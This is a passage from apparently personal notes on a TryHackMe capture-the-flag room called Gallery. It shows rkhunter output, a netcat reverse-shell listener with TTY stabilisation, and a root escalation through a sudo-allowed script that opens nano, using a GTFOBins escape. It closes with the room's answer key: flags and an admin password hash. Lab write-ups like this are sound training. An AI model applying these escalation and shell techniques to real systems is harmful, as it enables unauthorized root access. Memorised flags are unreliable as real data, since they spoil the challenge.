    rootkits        => avail_modules deleted_files hidden_procs ipc_shared_mem known_rkts loaded_modules login_backdoors possible_rkt_files possible_rkt_strings running_procs sniffer_logs susp_dirs suspscan tripwire trojans 
    shared_libs     => shared_libs_path 
    startup_files   => startup_malware 
    system_commands => attributes hashes immutable scripts shared_libs_path strings 
    system_configs  => system_configs_ssh system_configs_syslog 

Current languages:
    cn de en ja tr tr.utf8 zh zh.utf8

Rootkits checked for:
    55808 Trojan - Variant A, AjaKit, aPa Kit, Adore, Apache Worm, Ambient (ark),
    Balaur, BeastKit, beX2, BOBKit, Boonana (Koobface.A), cb,
    CiNIK Worm (Slapper.B variant), CX, Danny-Boy's Abuse Kit, Devil, Diamorphine LKM, Dica,
    Dreams, Duarawkz, Ebury, Enye LKM, Flea Linux, FreeBSD,
    Fu, Fuck`it, GasKit, Heroin LKM, HjC Kit, ignoKit,
    iLLogiC, Inqtana-A, Inqtana-B, Inqtana-C, IntoXonia-NG, Irix,
    Jynx, Jynx2, KBeast, Keydnap, Kitko, Knark,
    Komplex, ld-linuxv.so, Li0n Worm, Lockit/LJK2, Mokes, Mood-NT,
    MRK, Ni0, Ohhara, Optic Kit (Tux), OSXRK, Oz,
    Phalanx, Phalanx2, Portacelo, Proton, R3dstorm Toolkit, RH-Sharpe's,
    RSHA's, Scalper Worm, Shutdown, SHV4, SHV5, Sin,
    SInAR, Slapper, Sneakin, Solaris Wanuk, Spanish, Suckit,
    SunOS / NSDAP, SunOS Rootkit, Superkit, TBD (Telnet BackDoor), TeLeKiT, Togroot,
    T0rn, trNkit, Trojanit Kit, Turtle2, Tuxtendo, URK,
    Vampire, VcKit, Volc, w00tkit, weaponX, Xzibit,
    X-Org SunOS, zaRwT.KiT, ZK

Perl module installation status:
    perl command               Installed
    File::stat                 Installed
    Getopt::Long               Installed
    Crypt::RIPEMD160            MISSING
    Digest::MD5                Installed
    Digest::SHA                Installed
    Digest::SHA1                MISSING
    Digest::SHA256              MISSING
    Digest::SHA::PurePerl       MISSING
    Digest::Whirlpool           MISSING
    LWP                         MISSING
    URI                        Installed
    HTTP::Status               Installed
    HTTP::Date                 Installed
    Socket                     Installed
    Carp                       Installed.


mike@gallery:~$ sudo /bin/bash sudo /bin/bash /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? versioncheck
versioncheck
[ Rootkit Hunter version 1.4.6 ]

Checking rkhunter version...
  This version  : 1.4.6
  Latest version: Download failed

mike@gallery:~$ sudo /bin/bash sudo /bin/bash /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? update
update
[ Rootkit Hunter version 1.4.6 ]

Checking rkhunter data files...
  Checking file mirrors.dat                                  [ Skipped ]
  Checking file programs_bad.dat                             [ Update failed ]
  Checking file backdoorports.dat                            [ Update failed ]
  Checking file suspscan.dat                                 [ Update failed ]
  Checking file i18n versions                                [ Update failed ]

Please check the log file (/var/log/rkhunter.log)

using read .. opens nano in /root 

so let's use gtfobins

https://gtfobins.github.io/gtfobins/nano/

sudo nano
ctrl +r ctrl x
reset; sh 1>&0 2>&0

mike@gallery:/var/www/html/gallery/uploads$ /bin/nano' as root on gallery.             sudo /bin/bash /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read

uhmm something failed I'll stabilize another way

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lnvp 1337 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44628.
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gallery:/var/www/html/gallery/uploads$ 
zsh: suspended  rlwrap nc -lnvp 1337
                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ stty raw -echo ; fg
[1]  + continued  rlwrap nc -lnvp 1337
www-data@gallery:/var/www/html/gallery/uploads$ export SHELL=bash
export SHELL=bash
www-data@gallery:/var/www/html/gallery/uploads$ export TERM=xterm-256color
export TERM=xterm-256color


uhmm just using netcat without rlwrap . something fails when i open nano

──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1337                   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44634.
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gallery:/var/www/html/gallery/uploads$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ stty raw -echo ; fg
[1]  + continued  nc -lvnp 1337

www-data@gallery:/var/www/html/gallery/uploads$ 
www-data@gallery:/var/www/html/gallery/uploads$ 
www-data@gallery:/var/www/html/gallery/uploads$ export SHELL=bash
www-data@gallery:/var/www/html/gallery/uploads$ export TERM=xterm-256color
www-data@gallery:/var/www/html/gallery/uploads$ su mike
Password: 
mike@gallery:/var/www/html/gallery/uploads$ cd /home/mike
mike@gallery:~$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read

in my case press Ctrl + C , then Ctrl+R and Ctrl+X

and enter command reset; sh 1>&0 2>&0

^C Cancellp                     [ Read 0 lines ]# whoami
root
# cd /root
# ls
report.txt  root.txt
# cat root.txt
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

:)


```


![[Pasted image 20221223142505.png]]

  ![[Pasted image 20221223142802.png]]

![[Pasted image 20221223152253.png]]

![[Pasted image 20221223153303.png]]

![[Pasted image 20221223160632.png]]

![[Pasted image 20221223161124.png]]

![[Pasted image 20221223161358.png]]
![[Pasted image 20221223161443.png]]
How many ports are open?

*2*

What's the name of the CMS?  

*Simple Image Gallery*

What's the hash password of the admin user?  

*a228b12a08b6527e7978cbe5d914531c*

What's the user flag?

*THM{af05cd30bfed67849befd546ef}*

### Escalate to the root user

  
What's the root flag?

*THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}*


[[Agent T]]